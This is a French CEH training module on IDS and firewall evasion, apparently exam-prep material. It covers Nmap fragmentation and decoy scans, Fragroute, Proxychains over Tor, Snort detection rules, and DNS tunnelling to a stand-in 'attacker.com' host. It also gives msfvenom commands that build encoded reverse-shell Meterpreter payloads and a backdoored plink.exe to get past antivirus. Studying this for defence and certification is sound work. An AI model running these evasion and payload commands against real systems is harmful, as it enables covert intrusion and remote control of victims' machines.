# 🔴 Module 12 — Outils & Labs : Évasion IDS/Firewalls

> **CEH v13 | EC-Council**  
> `#Nmap` `#Fragroute` `#Proxychains` `#Snort` `#dns2tcp`

---

## 📌 Table des matières

1. [Nmap — Options d'évasion complètes](#1-nmap-évasion)
2. [Fragroute — Fragmentation avancée](#2-fragroute)
3. [Proxychains — Chaînage de proxies](#3-proxychains)
4. [Snort — Test et validation des règles](#4-snort)
5. [dns2tcp & iodine — DNS Tunneling](#5-dns-tunneling-outils)
6. [Metasploit — Encodeurs d'évasion](#6-metasploit-encodeurs)
7. [Workflow de lab complet](#7-workflow-complet)

---

## 1. Nmap — Options d'Évasion Complètes

```bash
# ─── FRAGMENTATION ───────────────────────────────────────────
nmap -f target                  # Fragments de 8 bytes
nmap -ff target                 # Fragments de 16 bytes
nmap --mtu 24 target            # MTU personnalisé (multiple de 8)

# ─── DÉCOY SCAN ──────────────────────────────────────────────
nmap -D RND:10 target           # 10 IPs décoy aléatoires
nmap -D 1.2.3.4,5.6.7.8,ME target  # Décoys spécifiques + vraie IP
nmap -D RND:5 --spoof-mac Cisco target  # Décoy + spoof MAC

# ─── PORT SOURCE ─────────────────────────────────────────────
nmap --source-port 53 target    # Semble venir du port DNS
nmap -g 80 target               # Source port 80 (même flag différent)

# ─── TIMING (SCAN LENT) ──────────────────────────────────────
nmap -T0 target                 # Paranoid : 5 min entre paquets
nmap -T1 target                 # Sneaky : 15 sec entre paquets
nmap --scan-delay 5s target     # Délai personnalisé

# ─── TTL ─────────────────────────────────────────────────────
nmap --ttl 128 target           # TTL personnalisé

# ─── DONNÉES ALÉATOIRES ──────────────────────────────────────
nmap --data-length 50 target    # Ajouter 50 bytes aléatoires aux paquets

# ─── COMBINÉ ─────────────────────────────────────────────────
nmap -f -T1 -D RND:5 -g 53 --data-length 25 target
```

### Comparaison des techniques

| Option | Cible | Contre-mesure défense |
|--------|-------|----------------------|
| `-f` | IDS signature-based | IDS avec réassemblage |
| `-D` | Attribution de l'IP | Corrélation logs |
| `-T0` | IDS time-window detection | Baseline longue durée |
| `-g 53` | Firewall port-based | Deep Packet Inspection |
| `--data-length` | Pattern matching | Analyse statistique |

---

## 2. Fragroute — Fragmentation Avancée

Fragroute intercepte et modifie les paquets sortants avant envoi.

```bash
# Installation :
apt-get install fragroute

# Configuration /etc/fragroute.conf :
ip_frag 16          # Fragmente IP en chunks de 16 bytes
tcp_seg 8           # Segmente TCP en chunks de 8 bytes
order random        # Envoie dans un ordre aléatoire
dup first 10%       # Duplique 10% des premiers paquets
ip_ttl 10           # Fixe TTL à 10

# Utilisation :
fragroute -f /etc/fragroute.conf 192.168.1.100

# Dans un autre terminal, les connexions vers 192.168.1.100
# seront automatiquement fragmentées
curl http://192.168.1.100/malicious-path
```

---

## 3. Proxychains — Chaînage de Proxies

```bash
# Fichier de config : /etc/proxychains4.conf

# Mode : strict_chain (tous dans l'ordre)
# Mode : dynamic_chain (skip les proxies morts)
# Mode : random_chain (ordre aléatoire)

strict_chain

[ProxyList]
# Type  Host            Port  [User  Pass]
socks5  127.0.0.1      9050              # Tor
socks4  proxy1.example  1080
http    proxy2.example  8080  user pass

# Utilisation :
proxychains4 nmap -sT -p 80,443 target.com
proxychains4 curl https://target.com
proxychains4 sqlmap -u "http://target.com/page?id=1"

# Avec Tor :
service tor start
proxychains4 firefox
```

---

## 4. Snort — Création et Test de Règles

```bash
# Tester une règle Snort :
snort -c /etc/snort/snort.conf -r capture.pcap -A console

# Mode IDS live :
snort -i eth0 -c /etc/snort/snort.conf -A fast

# Vérifier les règles sans lancer l'IDS :
snort -T -c /etc/snort/snort.conf
```

### Exemples de règles Snort

```
# Détecter un scan Nmap (NULL scan)
alert tcp any any -> $HOME_NET any (flags:0; msg:"NULL Scan detected"; sid:1001;)

# Détecter un scan SYN
alert tcp any any -> $HOME_NET any (flags:S; threshold: type both, track by_src, count 20, seconds 5; msg:"Port Scan SYN"; sid:1002;)

# Détecter NMAP OS fingerprint
alert tcp any any -> $HOME_NET any (flags:SFPU; msg:"XMAS Scan"; sid:1003;)

# Détecter SQL Injection
alert tcp any any -> $HTTP_SERVERS $HTTP_PORTS (content:"UNION SELECT"; nocase; msg:"SQL Injection UNION"; sid:1004;)

# Détecter download PowerShell
alert tcp $HTTP_SERVERS $HTTP_PORTS -> any any (content:"powershell"; nocase; msg:"PowerShell download attempt"; sid:1005;)
```

---

## 5. DNS Tunneling — dns2tcp & iodine

### dns2tcp

```bash
# ─── SERVEUR (machine contrôlée par l'attaquant avec NS record) ───
# /etc/dns2tcpd.conf :
listen = 0.0.0.0
port = 53
user = nobody
key = secretpassword
chroot = /tmp
domain = tunnel.attacker.com
resources = ssh:127.0.0.1:22, http:127.0.0.1:80

# Lancer :
dns2tcpd -F -f /etc/dns2tcpd.conf

# ─── CLIENT (machine derrière le firewall) ────────────────────────
dns2tcpc -r ssh -l 2222 -z tunnel.attacker.com -k secretpassword

# Connexion SSH via tunnel DNS :
ssh -p 2222 user@127.0.0.1
```

### iodine

```bash
# ─── SERVEUR ──────────────────────────────────────────────────────
iodined -f -c -P password 10.0.0.1 tunnel.attacker.com

# ─── CLIENT ───────────────────────────────────────────────────────
iodine -f -P password tunnel.attacker.com
# Crée l'interface dns0 avec IP 10.0.0.2
# Permet un vrai réseau IP via DNS !

# Ensuite :
ssh user@10.0.0.1  # Via le tunnel DNS
```

---

## 6. Metasploit — Encodeurs d'Évasion

```bash
# Lister les encodeurs disponibles :
msfvenom --list encoders

# Encodeur Shikata Ga Nai (polymorphique) :
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=attacker.com LPORT=4444 \
  -e x86/shikata_ga_nai -i 5 \    # 5 passes d'encodage
  -f exe > payload.exe

# Encodeur pour contourner les signatures IDS :
msfvenom -p windows/meterpreter/reverse_https \
  LHOST=attacker.com LPORT=443 \
  -e x86/unicode_upper -i 3 \
  -f exe > payload_unicode.exe

# Bypass AV avec template :
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=attacker LPORT=4444 \
  -x /usr/share/windows-binaries/plink.exe \  # Template légitime
  -f exe > backdoored_plink.exe
```

---

## 7. Workflow de Lab Complet

```
Scénario : Test de pénétration avec IDS Snort actif

Environnement :
- Kali Linux (attaquant)
- Ubuntu (cible) avec Snort IDS
- Réseau : 192.168.1.0/24

Étape 1 : Reconnaissance furtive
  nmap -T1 -f --source-port 53 -D RND:3 192.168.1.100
  → Scan lent, fragmenté, avec décoys

Étape 2 : Identification du service
  nmap -sV --version-intensity 2 192.168.1.100
  → Intensité faible pour réduire le bruit

Étape 3 : Exploitation via proxy
  proxychains4 msfconsole
  use exploit/multi/handler
  set payload windows/meterpreter/reverse_https
  set LHOST attacker.com
  set LPORT 443
  run

Étape 4 : Payload encodé
  msfvenom -p windows/meterpreter/reverse_https \
    LHOST=attacker.com LPORT=443 \
    -e x86/shikata_ga_nai -i 7 -f exe > payload.exe
  
Étape 5 : Vérification dans les logs Snort
  tail -f /var/log/snort/alert
  → Observer quelles alertes ont été générées vs manquées
```

---

## 🧠 Points clés à retenir pour l'examen

- `nmap -f` = fragmentation ; `nmap -D` = décoys ; `nmap -T0` = slow scan
- **Fragroute** = outil de fragmentation/modification des paquets sortants
- **Proxychains** = chaîner des proxies pour anonymiser le scan
- **dns2tcp / iodine** = tunneler du trafic via DNS (port 53)
- **Shikata Ga Nai** = encodeur Metasploit polymorphique (anti-signature)
- Les IDS modernes avec **réassemblage complet** résistent à la fragmentation

---

*⬅️ [Évasion Firewall & Honeypot](./03_evasion_firewall_honeypot.md) | ➡️ [Contre-mesures](./05_contre-mesures.md)*
